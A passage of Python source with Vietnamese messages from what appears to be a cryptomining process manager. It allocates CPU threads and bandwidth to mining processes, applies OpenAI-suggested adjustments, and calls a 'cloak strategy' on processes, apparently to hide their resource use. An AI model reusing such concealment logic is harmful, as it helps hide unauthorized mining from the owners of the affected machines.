                'args': (process, net_bw_limit_mbps)
            }
            self.resource_adjustment_queue.put((3, next(self._counter), t5))

            self.shared_resource_manager.apply_cloak_strategy('cache', process)

            self.logger.info(
                f"Đã áp dụng các điều chỉnh tài nguyên từ OpenAI cho {process.name} (PID={process.pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi apply_recommended_action cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
     
    def allocate_resources_with_priority(self):
        """
        Phân bổ tài nguyên (CPU threads) theo priority.
        """
        try:
            with self.resource_lock.gen_wlock(), self.mining_processes_lock.gen_rlock():
                flt_procs = []
                for p in self.mining_processes:
                    if not isinstance(p.priority, int):
                        self.logger.warning(f"Priority {p.priority} invalid, gán=1.")
                        p.priority = 1
                    flt_procs.append(p)

                s_procs = sorted(flt_procs, key=lambda x: x.priority, reverse=True)
                
                total_cores = psutil.cpu_count(logical=True)
                allocated = 0

                for p in s_procs:
                    if allocated >= total_cores:
                        self.logger.warning(
                            f"Không còn CPU core cho {p.name} (PID: {p.pid})."
                        )
                        continue

                    avb = total_cores - allocated
                    needed = min(p.priority, avb)
                    
                    # Lấy giá trị từ bộ đếm để đảm bảo độ ưu tiên duy nhất
                    count_val = next(self._counter)
                    
                    adjustment_task = {
                        'function': 'adjust_cpu_threads',
                        'args': (p.pid, needed, p.name)
                    }
                    self.resource_adjustment_queue.put((3, next(self._counter), adjustment_task))
                    allocated += needed
        except Exception as e:
            self.logger.error(
                f"Lỗi allocate_resources_with_priority: {e}\n{traceback.format_exc()}"
            )

    def shutdown_power_management(self):
        try:
            shutdown_power_management()
            self.logger.info("Đã tắt power_management.")
        except Exception as e:
            self.logger.error(f"Lỗi shutdown_power_management: {e}\n{traceback.format_exc()}")
